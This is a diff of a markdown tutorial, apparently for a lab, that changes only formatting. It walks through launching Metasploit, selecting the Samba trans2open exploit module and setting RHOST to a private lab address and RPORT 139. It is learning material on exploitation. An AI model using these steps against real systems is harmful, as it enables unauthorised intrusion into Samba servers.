@@ -26,7 +26,6 @@ execute
 sudo msfconsole
 ```
 ## Then we search the vulnerability and configure options for exploitation.
-
 ```bash
 search samba version command to search exploit
 ```
@@ -37,13 +36,16 @@ exploit/linux/samba/trans2open
 
 ```bash
 Options
-```   We can use options command to see the options.
+```
+We can use options command to see the options.
 
 Use:-
 msf exploit(linux/samba/trans2open) >
+
 ```bash
 set RHOST <target Ip(10.0.2.5)>
 ```
+
 msf exploit(linux/samba/trans2open) > 
 ```bash 
 set RPORT 139
